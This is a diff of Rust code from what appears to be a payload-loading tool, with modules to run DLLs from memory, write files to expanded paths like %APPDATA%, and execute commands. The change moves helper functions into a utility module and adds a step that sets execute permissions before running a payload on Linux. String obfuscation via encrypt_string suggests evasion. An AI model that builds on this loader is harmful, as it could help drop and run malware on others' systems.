@@ -6,12 +6,8 @@ type DllEntryPoint = extern "C" fn() -> c_int;
 use std::mem;
 
 use serde::{Deserialize, Serialize};
-//#[cfg(target_os = "linux")]
-//use std::os::unix::fs::PermissionsExt;
 
-use std::fs;
 use std::io::Cursor;
-use std::path::Path;
 use std::path::PathBuf;
 use std::process::Command;
 use std::{thread, time};
@@ -31,6 +27,13 @@ use crate::link::{Link, LinkFetch};
 use cryptify::encrypt_string;
 
 use anyhow::Result;
+
+use std::fs::File;
+
+use crate::payload_util::calculate_path;
+use crate::payload_util::create_diretory;
+use crate::payload_util::same_hash_sha512;
+use crate::payload_util::set_permission;
 
 pub enum PayloadExec {
     NoThread(),
@@ -104,11 +107,6 @@ impl DllFromMemory {
     pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
         error!("Its linux, impossible to run this payload: dll_from_memory");
         Ok(PayloadExec::NoThread())
-        /*let dllthread = thread::spawn(move || {
-            info!("hey");
-        });
-        Ok(PayloadExec::Thread(dllthread, Payload::DllFromMemory(self.clone())))
-        */
     }
 
     #[cfg(target_os = "windows")]
@@ -258,29 +256,6 @@ pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     Ok(PayloadExec::NoThread())
 }
 
-/*
-fn random_string() -> String {
-    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
-                            abcdefghijklmnopqrstuvwxyz\
-                            0123456789";
-    const PASSWORD_LEN: usize = 30;
-    let mut rng = rand::thread_rng();
-
-    let out_str: String = (0..PASSWORD_LEN)
-        .map(|_| {
-            let idx = rng.gen_range(0..CHARSET.len());
-            CHARSET[idx] as char
-        })
-        .collect();
-    out_str
-}
-
-pub fn basename(out_filepath: &String) -> String {
-    let path = Path::new(out_filepath);
-    let filename = path.file_name().unwrap();
-    filename.to_str().unwrap().to_string()
-}
-*/
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct WriteFile {
@@ -290,38 +265,7 @@ pub struct WriteFile {
                       //pub out_overwrite: bool,
                       //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
 }
-use std::fs::File;
-//use std::io::Write;
-use std::fs::create_dir_all;
-//use std::path::Path;
-use shellexpand;
 
-use chksum_sha2_512 as sha2_512;
-
-//use std::io;
-use std::io::prelude::*;
-//use std::fs::File;
-
-pub fn same_hash_sha512(hash: &String, path: &PathBuf) -> bool {
-    if *hash == "".to_string() {
-        return false;
-    }
-
-    let mut f = match File::open(path) {
-        Ok(f) => f,
-        Err(_) => return false,
-    };
-    let mut buffer: Vec<u8> = Vec::new();
-
-    // read the whole file
-    match f.read_to_end(&mut buffer) {
-        Ok(_) => (),
-        Err(_) => return false,
-    };
-    let digest = sha2_512::chksum(buffer).unwrap();
-
-    digest.to_hex_lowercase() == *hash
-}
 
 impl WriteFile {
     pub fn write_file(&self) -> Result<PayloadExec, anyhow::Error> {
@@ -343,29 +287,6 @@ impl WriteFile {
     }
 }
 
-pub fn calculate_path(path_with_env: &String) -> Result<PathBuf, anyhow::Error> {
-    let expanded = shellexpand::env(path_with_env)?; // Expands %APPDATA% or any other environment variable
-    let path: &Path = Path::new(&*expanded); // Convert to a Path
-    debug!("Expanded Path: {:?}", path);
-    Ok(path.to_owned())
-}
-
-pub fn create_diretory(path: &PathBuf) -> Result<(), anyhow::Error> {
-    match path.parent() {
-        Some(parent_dir) => {
-            if fs::metadata(parent_dir).is_ok() == false {
-                info!("[+] path not exist, create: {:?}", parent_dir);
-                create_dir_all(parent_dir)?;
-            }
-        }
-        None => error!(
-            "{}{:?}",
-            encrypt_string!("error, impossible to retreive parent path: "),
-            path
-        ),
-    };
-    Ok(())
-}
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Exec {
@@ -380,7 +301,8 @@ impl Exec {
         info!("Exec {:?} {}", &path, &self.cmdline);
         let mut comm = Command::new(&path);
 
-        //TODO add exec privs if linux
+        #[cfg(target_os = "linux")]
+        set_permission(&path);      
 
         for i in self.cmdline.trim().split_whitespace() {
             comm.arg(i);
